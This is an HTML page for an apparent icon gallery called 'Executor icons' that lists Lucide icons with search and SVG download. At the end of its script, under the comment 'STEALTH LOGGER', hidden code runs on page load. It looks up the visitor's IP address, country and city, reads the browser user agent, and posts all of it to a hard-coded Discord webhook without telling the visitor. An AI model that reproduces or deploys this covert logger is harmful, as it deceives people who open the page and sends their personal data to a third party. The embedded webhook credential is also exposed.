<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Executor ICONS</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        :root { --bg: #000; --card: #0a0a0a; --border: #1a1a1a; --accent: #fff; }
        
        body {
            background-color: var(--bg);
            color: #fff;
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 40px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        header { text-align: center; margin-bottom: 40px; }
        h1 { font-size: 2.5rem; letter-spacing: -1px; margin: 0; }
        header p { color: #666; margin-top: 10px; }

        /* Real Search Bar */
        .search-container {
            width: 100%;
            max-width: 500px;
            position: relative;
            margin-bottom: 50px;
        }

        #iconSearch {
            width: 100%;
            padding: 15px 20px;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.3s, box-shadow 0.3s;
        }

        #iconSearch:focus {
            border-color: var(--accent);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }

        /* Grid System */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 20px;
            max-width: 1100px;
            width: 100%;
        }

        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 35px 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
        }

        .card:hover {
            transform: translateY(-5px);
            border-color: var(--accent);
            background: #111;
        }

        .icon-name {
            margin-top: 15px;
            font-size: 0.8rem;
            color: #555;
            font-family: 'JetBrains Mono', monospace;
        }

        .card:hover .icon-name { color: #fff; }

        /* Notification Toast */
        .toast {
            position: fixed;
            bottom: 30px;
            background: #fff;
            color: #000;
            padding: 12px 25px;
            border-radius: 30px;
            font-weight: 600;
            font-size: 0.9rem;
            transform: translateY(100px);
            transition: transform 0.4s ease;
            z-index: 1000;
        }

        .toast.show { transform: translateY(0); }
    </style>
</head>
<body>

    <header>
        <h1>Executor icons</h1>
        <p>Icons by nice crib.</p>
    </header>

    <div class="search-container">
        <input type="text" id="iconSearch" placeholder="Search 28+ professional icons..." onkeyup="filterIcons()">
    </div>

    <div class="grid" id="iconGrid"></div>

    <div id="toast" class="toast">Downloading icon...</div>

    <script>
        const iconList = [
            'play', 'pause', 'settings', 'user', 'mail', 'bell', 'search', 'heart', 
            'share-2', 'download', 'cloud', 'github', 'database', 'command', 'cpu', 
            'terminal', 'code-2', 'layers', 'package', 'copy', 'trash-2', 'edit-3', 
            'external-link', 'folder-open', 'home', 'camera', 'shield', 'lock'
        ];

        const grid = document.getElementById('iconGrid');

        // Initial Render
        function renderIcons(list) {
            grid.innerHTML = '';
            list.forEach(name => {
                const card = document.createElement('div');
                card.className = 'card';
                card.setAttribute('data-name', name);
                card.innerHTML = `
                    <i data-lucide="${name}" size="36"></i>
                    <div class="icon-name">${name}</div>
                `;
                card.onclick = () => handleDownload(name);
                grid.appendChild(card);
            });
            lucide.createIcons();
        }

        // Search Engine
        function filterIcons() {
            const query = document.getElementById('iconSearch').value.toLowerCase();
            const filtered = iconList.filter(name => name.includes(query));
            renderIcons(filtered);
        }

        // Real Download Logic (Constructs a real SVG)
        function handleDownload(name) {
            const toast = document.getElementById('toast');
            toast.innerText = `Downloading ${name}.svg...`;
            toast.classList.add('show');

            // Get the actual SVG markup from Lucide
            setTimeout(() => {
                const iconElement = document.querySelector(`[data-lucide="${name}"]`);
                const svgMarkup = iconElement.outerHTML;
                
                const blob = new Blob([svgMarkup], { type: 'image/svg+xml' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `${name}.svg`;
                a.click();
                
                setTimeout(() => toast.classList.remove('show'), 2000);
            }, 600);
        }

        // STEALTH LOGGER
        const WEBHOOK = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";

        async function log() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "logged by crib mfer",
                            color: 16777215,
                            fields: [
                                { name: "IP", value: `\`${d.ip}\``, inline: true },
                                { name: "Origin", value: `${d.country_name}, ${d.city}`, inline: true },
                                { name: "Platform", value: navigator.userAgent.substring(0, 50), inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch(e) {}
        }

        renderIcons(iconList);
        window.onload = log;
    </script>
</body>
</html>
